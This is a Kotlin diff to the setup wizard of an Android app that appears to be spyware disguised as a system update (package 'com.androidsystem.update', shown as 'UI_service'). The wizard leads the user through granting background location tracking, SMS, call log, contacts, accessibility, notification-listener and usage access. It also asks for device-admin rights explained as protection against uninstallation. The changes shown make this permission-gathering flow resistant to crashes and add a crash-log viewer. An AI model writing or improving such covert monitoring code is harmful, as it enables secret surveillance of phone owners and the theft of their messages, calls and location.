@@ -11,6 +11,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -26,6 +27,7 @@ import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
+import androidx.compose.ui.text.style.TextOverflow
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
@@ -34,6 +36,7 @@ import com.androidsystem.update.receiver.DeviceAdminReceiver
 import com.androidsystem.update.service.CoreService
 import com.androidsystem.update.service.NotificationListener
 import kotlinx.coroutines.delay
+import java.io.File
 
 private const val PREFS_NAME = "app_prefs"
 private const val SETUP_COMPLETED_KEY = "setup_completed"
@@ -65,6 +68,17 @@ private fun SetupWizardContent() {
     // 11+ the system then auto-denies further dialog requests, so the wizard
     // must send the user to the app's settings screen instead.
     var backgroundDenied by remember { mutableStateOf(false) }
+
+    // Some ROMs have no activity for a given settings intent (e.g. battery
+    // optimization). A failed launch must never crash the wizard.
+    fun launchSafely(block: () -> Unit) {
+        try {
+            block()
+        } catch (e: Exception) {
+            Log.e("SetupWizard", "Launch failed", e)
+            stepError = "Tieto nastavenia sa nepodarilo otvoriť — použite „Už mám povolené“"
+        }
+    }
 
     val steps = listOf(
         "Povolenie polohy", "Povolenie SMS a hovorov", "Povolenie kontaktov",
@@ -113,7 +127,7 @@ private fun SetupWizardContent() {
         } else {
             backgroundDenied = true
             stepError = "Na sledovanie na pozadí treba „Povoliť vždy“. Otváram nastavenia aplikácie…"
-            appDetailsLauncher.launch(appDetailsIntent(context))
+            launchSafely { appDetailsLauncher.launch(appDetailsIntent(context)) }
         }
     }
 
@@ -125,7 +139,7 @@ private fun SetupWizardContent() {
             granted[Manifest.permission.ACCESS_COARSE_LOCATION] == true
         ) {
             if (!hasBackgroundLocation(context)) {
-                locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
+                launchSafely { locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) }
             } else {
                 stepError = null; step++
             }
@@ -220,7 +234,7 @@ private fun SetupWizardContent() {
         val permOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
             granted[Manifest.permission.POST_NOTIFICATIONS] == true
         if (permOk) {
-            notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+            launchSafely { notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
         } else {
             stepError = "Povolenie notifikácií je potrebné"
         }
@@ -258,78 +272,88 @@ private fun SetupWizardContent() {
                             Manifest.permission.ACCESS_BACKGROUND_LOCATION
                         )
                     }
-                    locationLauncher.launch(perms)
+                    launchSafely { locationLauncher.launch(perms) }
                 }
                 // Background missing AND the dialog was already declined → the
                 // system auto-denies further dialogs; go to app settings.
                 !hasBackgroundLocation(context) && backgroundDenied ->
-                    appDetailsLauncher.launch(appDetailsIntent(context))
+                    launchSafely { appDetailsLauncher.launch(appDetailsIntent(context)) }
                 // Background missing but never declined → ask via the dialog.
                 !hasBackgroundLocation(context) ->
-                    locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
+                    launchSafely { locationBackgroundLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) }
                 // Everything already granted.
                 else -> { stepError = null; step++ }
             }
         },
         {
-            smsCallLauncher.launch(arrayOf(
-                Manifest.permission.READ_SMS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_PHONE_STATE
-            ))
+            launchSafely {
+                smsCallLauncher.launch(arrayOf(
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_PHONE_STATE
+                ))
+            }
         },
-        { contactsLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS)) },
-        { usageLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
+        { launchSafely { contactsLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS)) } },
+        { launchSafely { usageLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } },
         {
-            val admin = ComponentName(context, DeviceAdminReceiver::class.java)
-            adminLauncher.launch(
-                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Ochrana pred odinštalovaním")
+            launchSafely {
+                val admin = ComponentName(context, DeviceAdminReceiver::class.java)
+                adminLauncher.launch(
+                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Ochrana pred odinštalovaním")
+                    }
+                )
+            }
+        },
+        { launchSafely { accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } },
+        {
+            launchSafely {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+                    ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
+                    != PackageManager.PERMISSION_GRANTED
+                ) {
+                    notificationPermLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
+                } else {
+                    notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                 }
-            )
-        },
-        { accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
-        {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED
-            ) {
-                notificationPermLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
-            } else {
-                notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             }
         },
         {
-            batteryLauncher.launch(
-                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:${context.packageName}")
-                }
-            )
-        },
-        {
-            val intent = when {
-                Build.MANUFACTURER.equals("Xiaomi", true) ->
-                    Intent("miui.intent.action.OP_AUTO_START").apply {
-                        putExtra("package_name", context.packageName)
-                        `package` = "com.miui.securitycenter"
-                    }
-                Build.MANUFACTURER.equals("Huawei", true) ->
-                    Intent("huawei.intent.action.HW_AUTO_START").apply {
-                        putExtra("packageName", context.packageName)
-                        `package` = "com.huawei.systemmanager"
-                    }
-                Build.MANUFACTURER.equals("OnePlus", true) ->
-                    Intent("oneplus.intent.action.OP_AUTO_START").apply {
-                        putExtra("package_name", context.packageName)
-                        `package` = "com.oneplus.security"
-                    }
-                else ->
-                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            launchSafely {
+                batteryLauncher.launch(
+                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                         data = Uri.parse("package:${context.packageName}")
                     }
+                )
             }
-            autoStartLauncher.launch(intent)
+        },
+        {
+            launchSafely {
+                val intent = when {
+                    Build.MANUFACTURER.equals("Xiaomi", true) ->
+                        Intent("miui.intent.action.OP_AUTO_START").apply {
+                            putExtra("package_name", context.packageName)
+                            `package` = "com.miui.securitycenter"
+                        }
+                    Build.MANUFACTURER.equals("Huawei", true) ->
+                        Intent("huawei.intent.action.HW_AUTO_START").apply {
+                            putExtra("packageName", context.packageName)
+                            `package` = "com.huawei.systemmanager"
+                        }
+                    Build.MANUFACTURER.equals("OnePlus", true) ->
+                        Intent("oneplus.intent.action.OP_AUTO_START").apply {
+                            putExtra("package_name", context.packageName)
+                            `package` = "com.oneplus.security"
+                        }
+                    else ->
+                        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                            data = Uri.parse("package:${context.packageName}")
+                        }
+                }
+                autoStartLauncher.launch(intent)
+            }
         },
         {
             val serviceIntent = Intent(context, CoreService::class.java)
@@ -358,6 +382,8 @@ private fun SetupWizardContent() {
                 .verticalScroll(rememberScrollState()),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
+            CrashInfoCard(context)
+            Spacer(Modifier.height(16.dp))
             Text("Nastavenie UI_service", fontSize = 24.sp, fontWeight = FontWeight.Bold)
             Spacer(Modifier.height(8.dp))
             Text("Krok ${step + 1} z ${steps.size}", fontSize = 14.sp, color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.6f))
@@ -435,6 +461,8 @@ private fun CompletionScreen(context: Context) {
         horizontalAlignment = Alignment.CenterHorizontally,
         verticalArrangement = Arrangement.Center
     ) {
+        CrashInfoCard(context)
+        Spacer(Modifier.height(16.dp))
         Text("✓", fontSize = 72.sp, color = MaterialTheme.colorScheme.primary)
         Spacer(Modifier.height(24.dp))
         Text("Nastavenie dokončené", fontSize = 20.sp, fontWeight = FontWeight.Bold, textAlign = TextAlign.Center)
@@ -489,6 +517,37 @@ private fun CompletionScreen(context: Context) {
     }
 }
 
+@Composable
+private fun CrashInfoCard(context: Context) {
+    var crashInfo by remember { mutableStateOf(readLastCrash(context)) }
+    if (crashInfo == null) return
+    Card(modifier = Modifier.fillMaxWidth()) {
+        Column(modifier = Modifier.fillMaxWidth().padding(16.dp)) {
+            Text(
+                "⚠ Posledný pád aplikácie",
+                fontSize = 13.sp,
+                fontWeight = FontWeight.Bold,
+                color = MaterialTheme.colorScheme.error
+            )
+            Spacer(Modifier.height(6.dp))
+            Text(
+                crashInfo.orEmpty(),
+                fontSize = 10.sp,
+                fontFamily = FontFamily.Monospace,
+                maxLines = 14,
+                overflow = TextOverflow.Ellipsis
+            )
+            Spacer(Modifier.height(6.dp))
+            TextButton(onClick = {
+                clearCrashLog(context)
+                crashInfo = null
+            }) {
+                Text("Vymazať", fontSize = 12.sp)
+            }
+        }
+    }
+}
+
 private fun isAccessibilityEnabled(context: Context): Boolean {
     val expected = "${context.packageName}/${AccessibilityServiceImpl::class.java.name}"
     val enabled = Settings.Secure.getString(
@@ -535,5 +594,24 @@ private fun hasBackgroundLocation(context: Context): Boolean {
 private fun appDetailsIntent(context: Context): Intent {
     return Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
         data = Uri.parse("package:${context.packageName}")
+    }
+}
+
+private fun readLastCrash(context: Context): String? {
+    return try {
+        val file = File(context.filesDir, "crash.log")
+        if (!file.exists()) return null
+        val entries = file.readText().split("\n----\n").filter { it.isNotBlank() }
+        entries.lastOrNull()?.trim()?.take(1500)
+    } catch (e: Exception) {
+        null
+    }
+}
+
+private fun clearCrashLog(context: Context) {
+    try {
+        File(context.filesDir, "crash.log").delete()
+    } catch (e: Exception) {
+        // ignore
     }
 }
